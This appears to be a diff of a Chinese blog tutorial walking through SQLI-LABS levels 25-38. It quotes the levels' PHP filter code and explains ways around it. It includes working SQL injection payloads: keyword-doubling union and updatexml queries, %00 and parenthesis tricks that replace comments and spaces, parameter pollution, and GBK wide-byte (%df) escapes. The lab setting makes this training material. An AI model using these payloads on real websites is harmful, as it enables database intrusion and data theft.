@@ -498,26 +498,44 @@ $id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id);    //Strip out AND (non c
 <pre><code>id=-1&#39; union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&#39;security&#39; --+</code></pre>
 <p>其他自行发散思维。</p>
 <h3 id="4-SQLI-LABS25a"><a href="#4-SQLI-LABS25a" class="headerlink" title="4.SQLI-LABS25a"></a>4.SQLI-LABS25a</h3><p>只是换了数据的闭合形式。不会用报错信息。其他一样。</p>
-<h3 id="5-SQLI-LABS26"><a href="#5-SQLI-LABS26" class="headerlink" title="5.SQLI-LABS26"></a>5.SQLI-LABS26</h3><pre><code>$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);      //strip out OR (non case sensitive)
+<h3 id="5-SQLI-LABS26"><a href="#5-SQLI-LABS26" class="headerlink" title="5.SQLI-LABS26"></a>5.SQLI-LABS26</h3><pre><code>$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);      //strip out OR (non case sensitive)       过滤大小写or
 
-$id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);    //Strip out AND (non case sensitive)
+$id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);    //Strip out AND (non case sensitive)       过滤大小写and
 
-$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);   //strip out /*
+$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);   //strip out /*                            过滤 /*
 
-$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);    //Strip out --
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);    //Strip out --                             过滤 --
 
-$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);     //Strip out #
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);     //Strip out #                              过滤 #
 
-$id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);    //Strip out spaces
+$id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);    //Strip out spaces                         过滤 空格
 
-$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);    //Strip out slashes</code></pre>
-<pre><code>过滤了大小写or和and，/*，--，#，空格，\。</code></pre>
+$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);    //Strip out slashes                    过滤 /和\
+
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.                    过滤 空格
+
+$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union                      过滤 单行union
+
+$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.                    过滤 多行select
+
+$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);      //Strip out UNION &amp; SELECT.      过滤 union+select 大小写</code></pre>
 <p>注释符号被过滤了。有个比较投机取巧的注释符；%00代替–或者#。或者利用引号闭合来注入。</p>
 <p>绕过空格的方法有，用<u>%20,%09,%0a,%0b,%0c,%0d,%a0</u>来代替。</p>
 <p>windows下apache会有解析问题用不了上面这种绕过空格的方法。所以还有终绕过方式。利用括号闭合进行绕过。</p>
 <p>如：</p>
 <pre><code>id=1&#39; oorr(updatexml(null,concat(0x3a,(select (group_concat(table_name)) from (infoorrmation_schema.tables) where(table_schema=&#39;security&#39;)),0x3a),null));%00</code></pre>
-<h3 id="6-SQLI-LABS26a"><a href="#6-SQLI-LABS26a" class="headerlink" title="6.SQLI-LABS26a"></a>6.SQLI-LABS26a</h3><h3 id="7-SQLI-LABS27"><a href="#7-SQLI-LABS27" class="headerlink" title="7.SQLI-LABS27"></a>7.SQLI-LABS27</h3><h3 id="8-SQLI-LABS27a"><a href="#8-SQLI-LABS27a" class="headerlink" title="8.SQLI-LABS27a"></a>8.SQLI-LABS27a</h3><h3 id="9-SQLI-LABS28"><a href="#9-SQLI-LABS28" class="headerlink" title="9.SQLI-LABS28"></a>9.SQLI-LABS28</h3><h3 id="10-SQLI-LABS28a"><a href="#10-SQLI-LABS28a" class="headerlink" title="10.SQLI-LABS28a"></a>10.SQLI-LABS28a</h3><h3 id="11-SQLI-LABS29"><a href="#11-SQLI-LABS29" class="headerlink" title="11.SQLI-LABS29"></a>11.SQLI-LABS29</h3><p>注：本关需要先在less-29/后加login.php才能正常进行。</p>
+<ul>
+<li><h3 id="SQLI-LABS26a"><a href="#SQLI-LABS26a" class="headerlink" title="SQLI-LABS26a"></a>SQLI-LABS26a</h3></li>
+<li><p>SQLI-LABS27</p>
+</li>
+<li><p>SQLI-LABS27a</p>
+</li>
+<li><p>SQLI-LABS28</p>
+</li>
+<li><h3 id="SQLI-LABS28a"><a href="#SQLI-LABS28a" class="headerlink" title="SQLI-LABS28a"></a>SQLI-LABS28a</h3><p>这几关都是对不同字符的进行过滤。<u>注入点包裹方式</u>的不同，可以利用<u>延时注入</u>进行判断。如果windows 下，因为apache解析问题而使<u>绕过空格的一些注释符</u></u>不能用，可以使用<u>括号闭合</u>绕过。如果union+select被过滤可以使用<u>布尔盲注结合burpsuite</u>来爆破出信息。</p>
+</li>
+</ul>
+<h3 id="11-SQLI-LABS29"><a href="#11-SQLI-LABS29" class="headerlink" title="11.SQLI-LABS29"></a>11.SQLI-LABS29</h3><p>注：本关需要先在less-29/后加login.php才能正常进行。</p>
 <p>知识补充：客户端请求数据—&gt;Tomacat服务器（过滤，验证）—&gt;Apache服务器（解析）—&gt;Tomacat(服务器)—&gt;返回给客户端</p>
 <table>
 <thead>
@@ -562,7 +580,30 @@ $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);    //Strip out slashe
 <pre><code>less-29/login.php?id=1&amp;id=-1&#39; union select 1,2,database() --+</code></pre>
 <p>其他自行思考。这里还有报错回显，所以也可以利用报错注入。</p>
 <h3 id="12-SQLI-LABS30"><a href="#12-SQLI-LABS30" class="headerlink" title="12.SQLI-LABS30"></a>12.SQLI-LABS30</h3><h3 id="13-SQLI-LABS31"><a href="#13-SQLI-LABS31" class="headerlink" title="13.SQLI-LABS31"></a>13.SQLI-LABS31</h3><p>这两关和29关差不多只是注入点不同。也可尝试使用延迟注入。</p>
-<h3 id="14-SQLI-LABS32"><a href="#14-SQLI-LABS32" class="headerlink" title="14.SQLI-LABS32"></a>14.SQLI-LABS32</h3>
+<h3 id="14-SQLI-LABS32"><a href="#14-SQLI-LABS32" class="headerlink" title="14.SQLI-LABS32"></a>14.SQLI-LABS32</h3><pre><code>$string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);     //escape any backslash
+
+$string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);                //escape single quote with a backslash
+
+$string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);                //escape double quote with a backslash</code></pre>
+<p><u>这关对\，‘，“进行了过滤。</u></p>
+<p>知识补充：</p>
+<pre><code>mysql_query(&quot;SET NAMES gbk&quot;);</code></pre>
+<p>对client，conncetion，results的编码方式都设置成了GBK。而我们传进去的数据是以UTF-8进行编码。GBK英文和中文字符都用2个字节进行编码，而UTF-8英文字符使用1个字符，中文则使用3个字节。（具体详情参考我的GBK和UTF-8编码的区别文章）</p>
+<p>当GBK对UTF-8编码的数据进行解码，如果高字节&gt;128，低字节也符合相应的要求的话。会被误认为是中文字符进行拼接。</p>
+<p>我们用GET注入使传进去的数据会自动进行一次<u>URL编码</u>。因为过滤’，”，\（\是%5c)，如果传进去是1‘会变成<u>1%5c%27</u>。这时’被转义了。如果在<u>‘前加%df</u>呢，会被编码成1%df%5c%27这时传进进行解码，GBK会认为<u>%df%5c</u>是一个整体而解析成一个汉字，而%27即’会被认为是个单独的字符进行解析这样解析完会变成<u>1+中文字符+‘</u>这是’并没并转义。所以成功绕过。</p>
+<p>可以构造句子如：</p>
+<pre><code>？id=-1%df&#39; union select 1,2,3 --+</code></pre>
+<p>其他思想和前面一样。这里不一定要用%df，大于128都可以。</p>
+<h3 id="15-SQLI-LABS34"><a href="#15-SQLI-LABS34" class="headerlink" title="15.SQLI-LABS34"></a>15.SQLI-LABS34</h3><p>同样用%df进行注释但发现失败为什么呢？</p>
+<p>打开burpsuite代理拦截下请求包会发现：</p>
+<pre><code>-admin%df&#39; union select 1,2 #
+变成
+-admin%25df%5C%27+union+select+1%2C2%23</code></pre>
+<p>会发现%df 会变转变成%25%df 它把% 编码成%25了；可以手动删除25 变成%df就可以再像GET注入那样注入了。</p>
+<h5 id="另一种注入方法"><a href="#另一种注入方法" class="headerlink" title="另一种注入方法"></a>另一种注入方法</h5><p>�’ union …</p>
+<p>�会被编码成%EF%BF%BD，其实原理和上个方法一样。%EF%BF解析成一个汉字    %BD%5C解析成一个汉字，剩下单独一个‘。作者认为这个方法比%df好用！</p>
+<h3 id="16-SQLI-LABS32-38"><a href="#16-SQLI-LABS32-38" class="headerlink" title="16.SQLI-LABS32-38"></a>16.SQLI-LABS32-38</h3><p>这几关都是利用宽字节注入方法。只是注入点包裹方式不同，报错回显信息的不同，过滤使用的函数不同。请自行思考！！！</p>
+
             </div>
             <hr/>
 
